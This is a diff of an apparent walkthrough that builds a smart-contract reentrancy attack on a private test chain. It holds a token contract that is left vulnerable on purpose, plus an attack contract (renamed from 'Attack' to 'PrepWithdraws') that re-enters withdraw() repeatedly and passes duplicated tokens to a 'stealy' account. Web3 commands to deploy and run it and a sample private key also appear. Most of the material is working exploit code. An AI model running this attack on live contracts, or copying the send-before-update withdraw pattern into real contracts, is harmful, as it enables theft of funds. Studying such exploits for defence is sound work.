@@ -54,8 +54,7 @@ stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea15
         }
     };
 
-    var twiSource = 'contract TokenWithInvariants {         event Log(string msg ,address from, address to, uint value);         mapping(address => uint) public balanceOf;         uint public totalSupply;         /* 1 token = 1 szabo */         uint public conversion = 1 szabo;          modifier checkInvariants {  _ if (false) throw;         }          /* intentionally vulnerable */         function deposit(uint amount) checkInvariants {           Log("deposit", msg.sender, 0x0, amount);           /* Throw if not enough value has been sent to "buy" token */           if (msg.value / conversion < amount) throw;           balanceOf[msg.sender] += amount;           totalSupply += amount;         }          function transfer(address to, uint value) checkInvariants {           Log("transfer", msg.sender, to, value);           if (balanceOf[msg.sender] >= value) {             balanceOf[to] += value;             balanceOf[msg.sender] -= value;           }         }          /* intentionally vulnerable */         function withdraw() checkInvariants {           uint balance = balanceOf[msg.sender];           Log("withdraw", 0x0, msg.sender, balance);           if (msg.sender.call.value(balance*conversion)()) {             totalSupply -= balance;             balanceOf[msg.sender] = 0;           }         }       }';
-
+    var twiSource =  'contract TokenWithInvariants {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;   /* 1 token = 1 szabo */   uint public conversion = 1 szabo;    modifier checkInvariants {     _     if (this.balance/conversion < totalSupply) throw;   }    /* intentionally vulnerable */   function deposit(uint amount) checkInvariants {     Log("deposit", msg.sender, 0x0, amount);     /* Throw if not enough value has been sent to "buy" token */     if (msg.value / conversion < amount) throw;     balanceOf[msg.sender] += amount;     totalSupply += amount;   }    function transfer(address to, uint value) checkInvariants {     Log("transfer", msg.sender, to, value);     if (balanceOf[msg.sender] >= value) {       balanceOf[to] += value;       balanceOf[msg.sender] -= value;     }   }    /* intentionally vulnerable */   function withdraw() checkInvariants {     uint balance = balanceOf[msg.sender];     Log("withdraw", 0x0, msg.sender, balance);     if (msg.sender.call.value(balance*conversion)()) {       totalSupply -= balance;       balanceOf[msg.sender] = 0;     }   } }';
 
 
     var twiCompiled = web3.eth.compile.solidity(twiSource);
@@ -77,22 +76,22 @@ Wait for mining
 
 Getting ready for our attack run
 
-    // Now compile the attack contract
+    // Now compile the PrepWithdraws contract
 
-    var attackSource = '/* The proxy contract is required to declare an interface    that Attack understands */ contract TWIProxy {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;    function transfer(address to, uint value) {   }    function deposit(uint amount) {   }    function withdraw() {   }  }   contract Attack {   event AttackLog(string msg, uint value);   bool performAttack = false;   uint8 depth = 0;   uint constant conversion = 1 szabo;   uint recursions = 1;   /* fill in with address of TokenWithInvariants contract */   TWIProxy twi;   address stealAddress;   uint8 numTokens;   uint tokensInWei;    /* Constructor */   function Attack(address _contractAddress, address _stealAddress, uint8 _numTokens, uint _recursions) {     twi = TWIProxy(_contractAddress);     stealAddress = _stealAddress;     numTokens    = _numTokens;     recursions   = _recursions;     tokensInWei  = numTokens * conversion;   }    /* Default function. Always run */   function() {     if (performAttack) {       depth = depth + 1;       AttackLog("value", (uint)(this.balance/conversion));       if (depth < recursions) {  /* attack again */         twi.withdraw();       } else {         AttackLog("Transferring tokens", 99);         twi.transfer.value(recursions*tokensInWei)(stealAddress,numTokens);         performAttack = false; /* turn off attack again*/       }     }   }    function reset() {     performAttack = false;   }    function attack() {     depth = 0;     performAttack = true;     /* Contract itself must have some funds to make deposit*/     twi.deposit.value(tokensInWei)(numTokens);     twi.withdraw();   }  }';
+    var prepWithdrawsSource = '/* The proxy contract is required to declare an interface    that PrepWithdraws understands */ contract TWIProxy {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;    function transfer(address to, uint value) {   }    function deposit(uint amount) {   }    function withdraw() {   }  }   /*  * This contract is used to modify an instance of the TokenWithInvariants  * contract in such a way that another contract, RaceToEmpty, can  * withdraw multiple times.  *  * numTokens is the number of tokens you wish to replicate  * numExtraWithDraws is the number of extra times you wish to withdraw it  * from the RaceToEmpty contract  */ contract PrepWithdraws {   event Log(string msg, uint value);   /* It is important that performAttack is initially false so    * that we can give ether to this contract to deposit into    * TokenWithInvariants contract without invoking logic of    * the default function    */   bool performAttack = false;   uint8 depth = 0;   uint constant conversion = 1 szabo;   uint numExtraWithdraws = 1;   /* Fill in with address of TokenWithInvariants contract */   TWIProxy twi;   address raceToEmptyAddress;   uint8 numTokens;   uint tokensInWei;    /* Constructor */   function PrepWithdraws(address _twiAddress, address _raceToEmptyAddress,                          uint8 _numTokens, uint _numExtraWithdraws) {     twi = TWIProxy(_twiAddress);     raceToEmptyAddress = _raceToEmptyAddress;     numTokens    = _numTokens;     numExtraWithdraws   = _numExtraWithdraws;     tokensInWei  = numTokens * conversion;   }    /* Default function. Always run */   function() {     if (performAttack) {       depth = depth + 1;       Log("value:", (uint)(this.balance/conversion));       if (depth < numExtraWithdraws) {  /* attack again */         twi.withdraw();       } else {         Log("Transferring tokens", numTokens);         twi.transfer.value(numExtraWithdraws*tokensInWei)(raceToEmptyAddress,numTokens);         performAttack = false; /* turn off attack again*/       }     }   }    function reset() {     performAttack = false;   }    function start() {     depth = 0;     performAttack = true;     /* Contract itself must have some funds to make deposit*/     twi.deposit.value(tokensInWei)(numTokens);     twi.withdraw();   }  }';
 
-    var attackCompiled = web3.eth.compile.solidity(attackSource);
-    var attackContract = web3.eth.contract(attackCompiled.Attack.info.abiDefinition);
 
-    var amountToSteal = 2;
-    var numWithdraws = 3;
+    var prepWithdrawsCompiled = web3.eth.compile.solidity(prepWithdrawsSource);
+    var prepWithdrawsContract = web3.eth.contract(prepWithdrawsCompiled.PrepWithdraws.info.abiDefinition);
 
-    var attack = attackContract.new(twi.address, stealy, amountToSteal, numWithdraws, { from: creator, data: attackCompiled.Attack.code, gas: 1000000, gasPrice: 1}, contractNotifier)
+    var numTokens = 2;
+    var numWithdraws = 10;
+
+    var prepWithdraws = prepWithdrawsContract.new(twi.address, stealy, numTokens, numWithdraws, { from: creator, data: prepWithdrawsCompiled.PrepWithdraws.code, gas: 1000000, gasPrice: 1}, contractNotifier)
 
 Wait for mining
 
-    var attackLogEvent = attack.AttackLog();
-    attackLogEvent.watch(function(err, result) {
+    prepWithdraws.Log().watch(function(err, result) {
       var a = result.args;
       if (err) { console.log(err); return; }
       console.log(a.msg, a.value);
@@ -100,21 +99,21 @@ Wait for mining
 
 
     // Give an initial amount to the attack contract
-    web3.eth.sendTransaction({from: stealy, to: attack.address, value: amountToSteal*weiInSzabo, gas: 1000000, gasPrice: 1 })
+    web3.eth.sendTransaction({from: stealy, to: prepWithdraws.address, value: numTokens*weiInSzabo, gas: 1000000, gasPrice: 1 })
 
 
     // Check previous state
-    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(attack):", twi.balanceOf(attack.address), "balanceOf(stealy):", twi.balanceOf(stealy));
-    console.log("TWI value:", szaboOf(twi.address), "attack value:", szaboOf(attack.address), "stealy value:", szaboOf(stealy));
+    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(prepWithdraws):", twi.balanceOf(prepWithdraws.address), "balanceOf(stealy):", twi.balanceOf(stealy));
+    console.log("TWI value:", szaboOf(twi.address), "prepWithdraws value:", szaboOf(prepWithdraws.address), "stealy value:", szaboOf(stealy));
 
     // Now we are ready for the attack
 
-    attack.attack({ from: stealy, gas: 10000000, gasPrice: 1})
+    prepWithdraws.start({ from: stealy, gas: 10000000, gasPrice: 1})
 
 Wait until finished
 
-    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(attack):", twi.balanceOf(attack.address), "balanceOf(stealy):", twi.balanceOf(stealy));
-    console.log("TWI value:", szaboOf(twi.address), "attack value:", szaboOf(attack.address), "stealy value:", szaboOf(stealy));
+    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(prepWithdraws):", twi.balanceOf(prepWithdraws.address), "balanceOf(stealy):", twi.balanceOf(stealy));
+    console.log("TWI value:", szaboOf(twi.address), "prepWithdraws value:", szaboOf(prepWithdraws.address), "stealy value:", szaboOf(stealy));
 
 # Oddities
 
